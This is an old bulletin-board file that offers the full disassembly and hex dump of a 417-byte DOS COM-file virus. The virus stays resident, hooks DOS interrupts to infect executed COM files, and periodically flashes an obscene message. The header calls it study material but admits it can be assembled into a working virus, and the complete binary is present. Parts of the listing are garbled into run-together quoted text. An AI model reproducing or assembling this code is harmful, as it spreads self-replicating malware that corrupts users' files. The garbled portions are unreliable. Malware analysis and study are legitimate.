

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
      thelp.lst						 Sourcer Listing v3.07     8-Jan-91   4:14 pm   Page 1

				;==========================================================================
                                ;==                             V-417                                    ==
				;==      Created:   8-Jan-91					         ==
				;==      Version:						         ==
				;==      Passes:    9	       Analysis Options on: BIOQRSUW	         ==
				;==========================================================================

     0100			START:
     0100 .06					PUSH	ES
     0101  1E					PUSH	DS
     0102  0E					PUSH	CS
     0103  1F					POP	DS
     0104  CD 12				INT	12H			; Put (memory size)/1K in ax
     0106  B1 06				MOV	CL,6
     0108  D3 E0				SHL	AX,CL			; Shift w/zeros fill
     010A  8E C0				MOV	ES,AX
     010C  BA 27B8				MOV	DX,27B8H
     010F  26: 81 3E 0100 1E06			CMP	WORD PTR ES:DATA_1E,1E06H	; (0000:0100=19B6H)
     0116  74 4E				JE	LOC_3			; Jump if equal
     0118  BB 0040				MOV	BX,40H
     011B  29 D8				SUB	AX,BX
     011D  8E C0				MOV	ES,AX
     011F  8B F2				MOV	SI,DX
     0121  BF 0100				MOV	DI,100H
     0124  B9 0300				MOV	CX,300H
     0127  F3/ A4				REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
     0129  31 C0				XOR	AX,AX			; Zero register
     012B  8E D8				MOV	DS,AX
     012D  81 3E 04F1 5254			CMP	WORD PTR DS:DATA_3E,5254H	; (0000:04F1=0)
     0133  74 31				JE	LOC_3			; Jump if equal
     0135  BE 0084				MOV	SI,84H
     0138  BF 0285				MOV	DI,285H
     013B  A5					MOVSW				; Mov [si] to es:[di]
     013C  A5					MOVSW				; Mov [si] to es:[di]
     013D  C7 44 FC 01DF			MOV	WORD PTR DS:DATA_4E[SI],1DFH	; (0000:FFFC=0FBC3H)
     0142  8C 44 FE				MOV	DS:DATA_5E[SI],ES	; (0000:FFFE=0CFCFH)
     0145  BE 0020				MOV	SI,20H
     0148  BF 01D1				MOV	DI,1D1H
     014B  A5					MOVSW				; Mov [si] to es:[di]
     014C  A5					MOVSW				; Mov [si] to es:[di]
     014D  C7 44 FC 0179			MOV	WORD PTR DS:DATA_4E[SI],179H	; (0000:FFFC=0FBC3H)
     0152  8C 44 FE				MOV	DS:DATA_5E[SI],ES	; (0000:FFFE=0CFCFH)
     0155  FF 0E 0413				DEC	WORD PTR DS:DATA_2E	; (0000:0413=27FH)
     0159  58					POP	AX
     015A  50					PUSH	AX
     015B  48					DEC	AX
     015C  8E D8				MOV	DS,AX
     015E  29 1E 0012				SUB	DS:DATA_7E,BX		; (8975:0012=0)
     0162  29 1E 0003				SUB	DS:DATA_6E,BX		; (8975:0003=0FFFFH)
     0166			LOC_3:						;  xref 8976:0116, 0133
     0166  BE 0074				MOV	SI,74H
     0169  BF 0100				MOV	DI,100H
     016C  1F					POP	DS
     016D  07					POP	ES
     016E  01 D6				ADD	SI,DX
     0170  57					PUSH	DI
     0171  A5					MOVSW				; Mov [si] to es:[di]
     0172  A4					MOVSB				; Mov [si] to es:[di]
     0173  C3					RETN

     0174 .E9 57 24				DB	0E9H, 57H, 24H
     0177  0030			DATA_9		DW	30H			;  xref 8976:0179, 017E, 0193
                                                |--------------------------------------------
     -------------------------------------------| INT 8  ->  CS:0179
                                                |--------------------------------------------
     0179 .2E: FF 06 0177			INC	CS:DATA_9		; (8976:0177=30H)
     017E  2E: 81 3E 0177 EA60			CMP	CS:DATA_9,0EA60H	; (8976:0177=30H)
     0185  72 49				JB	LOC_7			; Jump if below
     0187  50					PUSH	AX
     0188  53					PUSH	BX
     0189  51					PUSH	CX
     018A  52					PUSH	DX
     018B  56					PUSH	SI
     018C  1E					PUSH	DS
     018D  B4 0F				MOV	AH,0FH
     018F  CD 10				INT	10H			; Video display   ah=functn 0Fh
										;  get state, al=mode, bh=page
     0191  0E					PUSH	CS
     0192  1F					POP	DS
     0193  C7 06 0177 0000			MOV	DATA_9,0		; (8976:0177=30H)
     0199  50					PUSH	AX
     019A  B4 00				MOV	AH,0
     019C  CD 10				INT	10H			; Video display   ah=functn 00h
										;  set display mode in al
     019E  58					POP	AX
     019F  50					PUSH	AX
     01A0  D0 EC				SHR	AH,1			; Shift w/zeros fill
     01A2  8A D4				MOV	DL,AH
     01A4  80 EA 05				SUB	DL,5
     01A7  B6 0C				MOV	DH,0CH
     01A9  B4 02				MOV	AH,2
     01AB  CD 10				INT	10H			; Video display   ah=functn 02h
										;  set cursor location in dx
     01AD  BE 01D5				MOV	SI,1D5H
     01B0  B4 0E				MOV	AH,0EH
     01B2			LOC_4:						;  xref 8976:01B9
     01B2  AC					LODSB				; String [si] to al
     01B3  08 C0				OR	AL,AL			; Zero ?
     01B5  74 04				JZ	LOC_5			; Jump if zero
     01B7  CD 10				INT	10H			; Video display   ah=functn 0Eh
										;  write char al, teletype mode
     01B9  EB F7				JMP	SHORT LOC_4		; (01B2)
     01BB			LOC_5:						;  xref 8976:01B5
     01BB  31 C9				XOR	CX,CX			; Zero register
     01BD  BA 00C8				MOV	DX,0C8H

     01C0			LOCLOOP_6:					;  xref 8976:01C0, 01C3
     01C0  E2 FE				LOOP	LOCLOOP_6		; Loop if cx > 0

     01C2  4A					DEC	DX
     01C3  75 FB				JNZ	LOCLOOP_6		; Jump if not zero
     01C5  58					POP	AX
     01C6  B4 00				MOV	AH,0
     01C8  CD 10				INT	10H			; Video display   ah=functn 00h
										;  set display mode in al
     01CA  1F					POP	DS
     01CB  5E					POP	SI
     01CC  5A					POP	DX
     01CD  59					POP	CX
     01CE  5B					POP	BX
     01CF  58					POP	AX
     01D0			LOC_7:						;  xref 8976:0185
     01D0  EA 0BE4:00AA		;*		JMP	FAR PTR LOC_1		; (0BE4:00AA)

     01D5  46 75 63 6B 20 59			DB	'Fuck You!'
     01DB  6F 75 21
     01DE  00					DB	0
                                                |--------------------------------------------
     -------------------------------------------| INT 21  ->  CS:01DF
                                                |--------------------------------------------
     01DF .50					PUSH	AX
     01E0  2D 4B00				SUB	AX,4B00H
     01E3  74 03				JZ	LOC_8			; Jump if zero
     01E5  E9 009B				JMP	LOC_13			; (0283)
     01E8			LOC_8:						;  xref 8976:01E3
     01E8  53					PUSH	BX
     01E9  51					PUSH	CX
     01EA  52					PUSH	DX
     01EB  56					PUSH	SI
     01EC  57					PUSH	DI
     01ED  1E					PUSH	DS
     01EE  06					PUSH	ES
     01EF  0E					PUSH	CS
     01F0  07					POP	ES
     01F1  B8 3D02				MOV	AX,3D02H
     01F4  CD 21				INT	21H			; DOS Services  ah=function 3Dh
										;  open file, al=mode,name@ds:dx
     01F6  73 03				JNC	LOC_9			; Jump if carry=0
     01F8  E9 0081				JMP	LOC_12			; (027C)
     01FB			LOC_9:						;  xref 8976:01F6
     01FB  8B D8				MOV	BX,AX
     01FD  0E					PUSH	CS
     01FE  1F					POP	DS
     01FF  BA 02A1				MOV	DX,2A1H
     0202  B9 0003				MOV	CX,3
     0205  E8 008A				CALL	SUB_3			; (0292)
     0208  A1 02A1				MOV	AX,DS:DATA_10E		; (8976:02A1=0)
     020B  3D 5A4D				CMP	AX,5A4DH
     020E  74 68				JE	LOC_11			; Jump if equal
     0210  3D 4D5A				CMP	AX,4D5AH
     0213  74 63				JE	LOC_11			; Jump if equal
     0215  8B F2				MOV	SI,DX
     0217  BF 0174				MOV	DI,174H
     021A  F3/ A4				REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
     021C  3C E9				CMP	AL,0E9H
     021E  75 1D				JNE	LOC_10			; Jump if not equal
     0220  8B 16 02A2				MOV	DX,WORD PTR DS:DATA_10E+1	; (8976:02A2=0)
     0224  83 C2 03				ADD	DX,3
     0227  B0 00				MOV	AL,0
     0229  E8 005F				CALL	SUB_2			; (028B)
     022C  BA 02A1				MOV	DX,2A1H
     022F  B9 0002				MOV	CX,2
     0232  E8 005D				CALL	SUB_3			; (0292)
     0235  81 3E 02A1 1E06			CMP	WORD PTR DS:DATA_10E,1E06H	; (8976:02A1=0)
     023B  74 3B				JE	LOC_11			; Jump if equal
     023D			LOC_10:						;  xref 8976:021E
     023D  B0 02				MOV	AL,2
     023F  E8 0047				CALL	SUB_1			; (0289)
     0242  09 D2				OR	DX,DX			; Zero ?
     0244  75 32				JNZ	LOC_11			; Jump if not zero
     0246  3D 07C6                              CMP     AX,7C6H                 ; Len > 1990 (7C6h)
     0249  72 2D				JB	LOC_11			; Jump if below
     024B  3D FA00                              CMP     AX,0FA00H               ; Len < 64000="" (fa00h)="" 024e="" 73="" 28="" jae="" loc_11="" ;="" jump="" if="" above="" or="0250" 2d="" 0003="" sub="" ax,3="" 0253="" a3="" 02a2="" mov="" word="" ptr="" ds:data_10e+1,ax="" ;="" (8976:02a2="0)" 0256="" c6="" 06="" 02a1="" e9="" mov="" byte="" ptr="" ds:data_10e,0e9h="" ;="" (8976:02a1="0)" 025b="" 05="" 0103="" add="" ax,103h="" 025e="" a3="" 010d="" mov="" word="" ptr="" ds:[10dh],ax="" ;="" (8976:010d="27B8H)" 0261="" ba="" 0100="" mov="" dx,100h="" 0264="" b9="" 01a1="" mov="" cx,1a1h="" ;="" len="417" (1a1h)="" 0267="" e8="" 0033="" call="" sub_4="" ;="" (029d)="" 026a="" b0="" 00="" mov="" al,0="" 026c="" e8="" 001a="" call="" sub_1="" ;="" (0289)="" 026f="" ba="" 02a1="" mov="" dx,2a1h="" 0272="" b9="" 0003="" mov="" cx,3="" 0275="" e8="" 0025="" call="" sub_4="" ;="" (029d)="" 0278="" loc_11:="" ;="" xref="" 8976:020e,="" 0213,="" 023b,="" 0244="" ;="" 0249,="" 024e,="" 0299="" 0278="" b4="" 3e="" mov="" ah,3eh="" ;="" '="">'
     027A  CD 21				INT	21H			; DOS Services  ah=function 3Eh
										;  close file, bx=file handle
     027C			LOC_12:						;  xref 8976:01F8
     027C  07					POP	ES
     027D  1F					POP	DS
     027E  5F					POP	DI
     027F  5E					POP	SI
     0280  5A					POP	DX
     0281  59					POP	CX
     0282  5B					POP	BX
     0283			LOC_13:						;  xref 8976:01E5
     0283  58					POP	AX
     0284  EA 0EBB:0260		;*		JMP	FAR PTR LOC_2		; (0EBB:0260)
     0284  EA 60 02 BB 0E			DB	0EAH, 60H, 02H,0BBH, 0EH

				T-BIN		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8976:023F, 026C
				;==========================================================================

				SUB_1		PROC	NEAR
     0289  31 D2				XOR	DX,DX			; Zero register

				;==== External Entry into Subroutine ======================================
				;         Called from:	 8976:0229

				SUB_2:
     028B  B4 42				MOV	AH,42H			; 'B'
     028D  31 C9				XOR	CX,CX			; Zero register
     028F  CD 21				INT	21H			; DOS Services  ah=function 42h
										;  move file ptr, cx,dx=offset
     0291  C3					RETN
				SUB_1		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8976:0205, 0232
				;==========================================================================

				SUB_3		PROC	NEAR
     0292  B4 3F				MOV	AH,3FH			; '?'
     0294			LOC_14:						;  xref 8976:029F
     0294  CD 21				INT	21H			; DOS Services  ah=function 40h
										;  write file cx=bytes, to ds:dx
     0296  29 C8				SUB	AX,CX
     0298  58					POP	AX
     0299  75 DD				JNZ	LOC_11			; Jump if not zero
     029B  FF E0				JMP	AX			; Register jump

				;==== External Entry into Subroutine ======================================
				;         Called from:	 8976:0267, 0275

				SUB_4:
     029D  B4 40				MOV	AH,40H			; '@'
     029F  EB F3				JMP	SHORT LOC_14		; (0294)
				SUB_3		ENDP

				SEG_A		ENDS
						END	START

---------------------------------------------------------------
| Dump Mader   Ver 2.2               Tue Jan 08 16:15:21 1991 |
---------------------------------------------------------------

Dumping file : t-bin.com
               417 bytes length
               16:8:19  8-1-1991  created (modifyed)

0100:  06 1E 0E 1F CD 12 B1 06 D3 E0 8E C0 BA B8 27 26    "..............'&"
0110:  81 3E 00 01 06 1E 74 4E BB 40 00 29 D8 8E C0 8B    ".>....tN.@.)...."
0120:  F2 BF 00 01 B9 00 03 F3 A4 31 C0 8E D8 81 3E F1    ".........1....>."
0130:  04 54 52 74 31 BE 84 00 BF 85 02 A5 A5 C7 44 FC    ".TRt1.........D."
0140:  DF 01 8C 44 FE BE 20 00 BF D1 01 A5 A5 C7 44 FC    "...D.. .......D."
0150:  79 01 8C 44 FE FF 0E 13 04 58 50 48 8E D8 29 1E    "y..D.....XPH..)."
0160:  12 00 29 1E 03 00 BE 74 00 BF 00 01 1F 07 01 D6    "..)....t........"
0170:  57 A5 A4 C3 E9 57 24 30 00 2E FF 06 77 01 2E 81    "W....W$0....w..."
0180:  3E 77 01 60 EA 72 49 50 53 51 52 56 1E B4 0F CD    ">w.`.rIPSQRV...."
0190:  10 0E 1F C7 06 77 01 00 00 50 B4 00 CD 10 58 50    ".....w...P....XP"
01A0:  D0 EC 8A D4 80 EA 05 B6 0C B4 02 CD 10 BE D5 01    "................"
01B0:  B4 0E AC 08 C0 74 04 CD 10 EB F7 31 C9 BA C8 00    ".....t.....1...."
01C0:  E2 FE 4A 75 FB 58 B4 00 CD 10 1F 5E 5A 59 5B 58    "..Ju.X.....^ZY[X"
01D0:  EA AA 00 E4 0B 46 75 63 6B 20 59 6F 75 21 00 50    ".....Fuck You!.P"
01E0:  2D 00 4B 74 03 E9 9B 00 53 51 52 56 57 1E 06 0E    "-.Kt....SQRVW..."
01F0:  07 B8 02 3D CD 21 73 03 E9 81 00 8B D8 0E 1F BA    "...=.!s........."
0200:  A1 02 B9 03 00 E8 8A 00 A1 A1 02 3D 4D 5A 74 68    "...........=MZth"
0210:  3D 5A 4D 74 63 8B F2 BF 74 01 F3 A4 3C E9 75 1D    "=ZMtc...t...<.u." 0220:="" 8b="" 16="" a2="" 02="" 83="" c2="" 03="" b0="" 00="" e8="" 5f="" 00="" ba="" a1="" 02="" b9="" ".........._....."="" 0230:="" 02="" 00="" e8="" 5d="" 00="" 81="" 3e="" a1="" 02="" 06="" 1e="" 74="" 3b="" b0="" 02="" e8="" "...]..="">....t;..."
0240:  47 00 09 D2 75 32 3D C6 07 72 2D 3D 00 FA 73 28    "G...u2=..r-=..s("
0250:  2D 03 00 A3 A2 02 C6 06 A1 02 E9 05 03 01 A3 0D    "-..............."
0260:  01 BA 00 01 B9 A1 01 E8 33 00 B0 00 E8 1A 00 BA    "........3......."
0270:  A1 02 B9 03 00 E8 25 00 B4 3E CD 21 07 1F 5F 5E    "......%..>.!.._^"
0280:  5A 59 5B 58 EA 60 02 BB 0E 31 D2 B4 42 31 C9 CD    "ZY[X.`...1..B1.."
0290:  21 C3 B4 3F CD 21 29 C8 58 75 DD FF E0 B4 40 EB    "!..?.!).Xu....@."
02A0:  F3                                                 "."



</.u.">